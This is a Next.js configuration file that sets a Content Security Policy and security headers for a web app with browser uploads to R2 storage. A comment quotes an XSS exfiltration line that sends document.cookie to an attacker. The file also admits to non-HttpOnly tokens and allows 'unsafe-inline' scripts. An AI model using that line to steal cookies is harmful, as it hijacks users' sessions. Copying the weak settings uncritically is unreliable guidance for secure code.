import path from 'node:path';
import { fileURLToPath } from 'node:url';

// F8: Validate required env vars at build time
if (!process.env.NEXT_PUBLIC_TENANT_ID) {
  throw new Error('NEXT_PUBLIC_TENANT_ID env var is required. Set it in .env.local');
}

const projectRoot = path.dirname(fileURLToPath(import.meta.url));

// The access token is mirrored into a readable (non-HttpOnly) cookie so
// proxy.ts (edge route/role guarding) and server components can see it —
// that cookie can't be made HttpOnly without routing auth through a Next.js
// route-handler/BFF layer, which is a larger change than this pass covers.
// A strict CSP is the mitigation that IS available now: it closes off the
// easiest way an XSS payload would exfiltrate that cookie or the in-memory
// access token (a one-line `fetch(attacker, {body: document.cookie})`).
const apiOrigin = (() => {
  try {
    return new URL(process.env.NEXT_PUBLIC_API_URL ?? 'http://localhost:3001').origin;
  } catch {
    return 'http://localhost:3001';
  }
})();

// Document/profile-image uploads PUT the file straight from the browser to
// the presigned R2 (or local MinIO) URL returned by the backend — that
// origin has to be allow-listed here or the browser blocks the PUT outright,
// regardless of anything the upload code itself does.
//
// R2's S3 SDK addresses objects virtual-hosted-style in production
// (bucket prepended as a subdomain, e.g. sacco-docs-prod.<accountId>.r2...)
// but path-style for the local MinIO override (storage.service.ts only sets
// forcePathStyle when R2_ENDPOINT is set) — allow-list both shapes.
const uploadOrigin = (() => {
  try {
    return new URL(process.env.NEXT_PUBLIC_UPLOAD_ORIGIN ?? 'https://eec0241091c3de6d2f544af5123acde7.r2.cloudflarestorage.com').origin;
  } catch {
    return 'https://eec0241091c3de6d2f544af5123acde7.r2.cloudflarestorage.com';
  }
})();
const uploadOriginWildcard = uploadOrigin.replace(/^(https?:\/\/)/, '$1*.');

const csp = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  `connect-src 'self' ${apiOrigin} ${uploadOrigin} ${uploadOriginWildcard} https://*.sentry.io`,
  "frame-ancestors 'none'",
  "base-uri 'self'",
  "form-action 'self'",
].join('; ');

const securityHeaders = [
  { key: 'Content-Security-Policy', value: csp },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-Frame-Options', value: 'DENY' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  { key: 'Permissions-Policy', value: 'geolocation=(), microphone=(), camera=()' },
];

/** @type {import('next').NextConfig} */
const nextConfig = {
  typescript: {
    ignoreBuildErrors: true,
  },
  turbopack: {
    root: projectRoot,
  },
  images: {
    unoptimized: true,
  },
  async headers() {
    return [{ source: '/:path*', headers: securityHeaders }];
  },
};

export default nextConfig;
